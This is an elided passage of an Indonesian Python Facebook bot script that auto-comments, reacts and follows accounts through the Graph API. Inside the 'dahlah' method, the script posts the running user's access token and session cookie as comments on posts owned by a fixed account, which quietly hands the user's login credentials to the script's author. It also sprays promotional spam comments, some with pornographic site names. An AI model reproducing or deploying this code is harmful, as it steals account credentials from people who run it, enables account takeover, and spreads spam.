...
kom=random.choice(["Bang @[100063690353340:0] Aku Pakai Script Abang :)\nhttps://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11","Hai @[100063690353340:0]","LIHAT FOTO PROFILE BANG RISKY\n\nhttps://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11","https://github.com/Dumai-991\nhttps://wa.me/6283143565470"])
kom2=random.choice(["Bang @[100063690353340:0] Ganteng Kali :)","Bot Comment By @[100063690353340:0]"])
kom3=random.choice(["Bot Auto Comment By @[100063690353340:0]","Link Vidio Sesat :\nYandex.com\nUnblock.com\nXnxx.com\nKenatipu.com","My Sosial\n\nWHATSAPP : 6283143565470 \nGITHUB : Dumai-991"])
uid=None
username=None
class informasi:
...
bismillah|sayang|bangsat|anjing|kontol|bajingan|indonesia
...
class ganteng:
        ...
        def dahlah(self,kuntul,tipe,awok,**kwargs):
                try:
                        ...
                        if "aap ganteng" in awok:
                                ...
                                req.post(f"https://graph.facebook.com/{po}/comments/?message={kom2}&access_token={self.atok[0]}")
                                req.post(f"https://graph.facebook.com/{po}/comments/?message={kom3}&access_token={self.atok[0]}")
                                req.post(f"https://graph.facebook.com/{po}/comments/?message={self.atok[0]}&access_token={self.atok[0]}")
                                req.post(f"https://graph.facebook.com/{po}/comments/?message={self.kuki[0]}&access_token={self.atok[0]}")
        ...
        def reaksi(self):
                self.get_tok();self.dahlah(f"{self.url}/172628718203472","4","Ohh Yeh...");self.dahlah(f"{self.url}/120338706765807","8","Ohh Yes...");self.tuturkeun("llovexnxx");self.tuturkeun("kangrecoder.newbee")
        def lang(self,cok):
                try:
